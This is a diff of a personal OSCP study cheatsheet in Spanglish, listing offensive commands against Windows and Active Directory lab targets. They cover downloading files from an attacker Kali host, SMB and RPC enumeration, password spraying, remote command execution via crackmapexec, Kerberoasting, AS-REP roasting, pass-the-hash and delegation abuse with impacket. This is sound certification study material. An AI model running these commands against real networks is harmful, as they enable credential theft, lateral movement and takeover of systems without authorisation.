@@ -1,5 +1,7 @@
 # OSCP_Command_Cheatsheet
 
+Just a handful of commands I normally use. There a lot of things that are missing, I will be updating this regularly as I keep learning/practicing new things.
+
 Spanglish included, this is a cheatsheet. 
 
 ## Misc Commands from Linux
@@ -185,6 +187,13 @@ certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero
 new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
 powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2
 
+# A través de una carpeta compartida de mi kali
+# Levantar servidor SMB con impacket-smbserver
+impacket-smbserver -smb2support -user <loquequieras> -password 'loquequieras' nombre_deseado_share ruta_carpeta_a_compartir
+
+# Conectarse desde windows
+NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
+
 ```
 
 ## Port Scanning
@@ -262,7 +271,8 @@ dig axfr  @<DNS_IP> <DOMAIN>
 ```
 
 ## Enumerar LDAP manualmente usando consola Python 
-(más en ![Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 
+
+Más filtros de búsqueda LDAP en ![Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 
 
 ```
 >>> import ldap3
@@ -289,3 +299,151 @@ dig axfr  @<DNS_IP> <DOMAIN>
 # Búsqueda de todos los atributos de un usuario
 >>> connection.search(search_base='cn=users,dc=support,dc=htb',search_filter='(sAMAccountName=<username>)', search_scope='SUBTREE', attributes='*')
 >>> connection.entries
+
+```
+
+## Enumerar SMB
+
+```
+
+# Info Con Enum4Linux
+enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
+
+# Obtener Usuarios
+crackmapexec smb <IP_address> --users [-u <username> -p <password>]
+
+# Enumerar grupos
+crackmapexec smb <IP_address> --groups --loggedon-users [-u <username> -p <password>]
+
+# Enumerar shares (varias opciones)
+crackmapexec smb 10.10.10.10 --shares [-u <username> -p <password>]
+smbclient --no-pass -L //<IP>
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
+
+# Conectarse a una share (varias opciones)
+smbclient --no-pass //<IP>/<Folder>
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>/<Folder>
+smbclient -U '%' -N \\\\<IP>\\<SHARE>
+smbclient -U '<USER>' \\\\<IP>\\<SHARE>
+
+# Montar una share
+mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
+
+# Descargar toda una share
+smbclient //<IP>/<share>
+mask ""
+recurse
+prompt
+mget *
+
+# Hacer spidering de una share buscando un patrón concreto ("." como patrón)
+crackmapexec smb <ip_Addres> -u '' -p '' --spider <nombre_share> --pattern "."
+
+# Realizar ataque Password Spraying
+crackmapexec smb <ip_address> -u <users_file> -p <password> --continue-on-success
+
+# Ejecutar comandos
+crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoami
+
+```
+
+## Enumerar RPC
+
+```
+
+# Conexión anónima (el resto de comandos son una vez se ha establecido la conexión)
+rpcclient -U "" -N <IP_ADDRESS>
+
+# Server Info
+srvinfo
+
+# Listar usuarios
+querydispinfo
+enumdomusers
+
+# Info de un ususario
+queryuser <0xrid>
+
+# Grupos de un usuario
+queryusergroups <0xrid>
+
+# SID de un usuario
+lookupnames <username>
+
+# Alias de un usuario
+queryuseraliases [builtin|domain] <sid>
+
+# Listar grupos
+enumdomgroups
+
+# Información de un grupo
+querygroup <0xrid>
+
+# Miembros de un grupo
+querygroupmem <0xrid>
+
+# Listar alias de grupo
+enumalsgroups <builtin|domain>
+
+# Miembros del grupo por el alias
+queryaliasmem builtin|domain <0xrid>
+
+# Listar dominios
+enumdomains
+
+# SID del dominio
+lsaquery
+
+# Info del dominio
+querydominfo
+
+# Listar las shares
+netshareenumall
+
+# Info de una share
+netsharegetinfo <share>
+
+```
+
+## Ataques a Kerberos
+
+Recomendado ![Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/#Kerberoasting)
+
+Recomendado ![The Hacker Recipes - Kerberos - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
+
+```
+
+# Fuerza bruta a kerberos	
+kerbrute -domain <domai> -users <user_file> -passwords <password_file> -outputfile <output_file>
+
+# ASrepRoast	
+impacket-GetNPUsers.py <dominio>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+# Kerberoast	
+impacket-GetUserSPNs jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
+
+# Overpass The Hash/Pass The Key (PTK)	
+impacket-getTGT <domain</<username> -hashes :<hash_value>
+export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+impacket-psexec <dominio>/<user>@servicio.domain.htb -k -no-pass
+
+# Pass the Hash	
+impacket-psexec -hashes "<hashes>" <username>@domain
+
+# Buscar Delegación	
+impacket-findDelegation domain/username:password
+
+# Añadir pc al dominio	
+impacket-addcomputer domain/username -hashes <hash> -computer-name <algo> -computer-pass <otro_algo> -dc-host <dc_hostname>
+
+# Solicitar Service Ticket y usarlo	(Constrained Delegation with Protocol Transition)
+impacket-getST -spn "cifs/target" -impersonate "administrator" domain/user -hashes <hash> # Este comando guarda el ticket en administrator.ccache
+export KRB5CCNAME=administrator.ccache
+impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
+
+# Solicitar Service Ticket y usarlo	(Constrained Delegation without Protocol Transition)
+impacket-getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password" # Este comando guarda el ticket en administrator.ccache
+export KRB5CCNAME=administrator.ccache
+impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
+
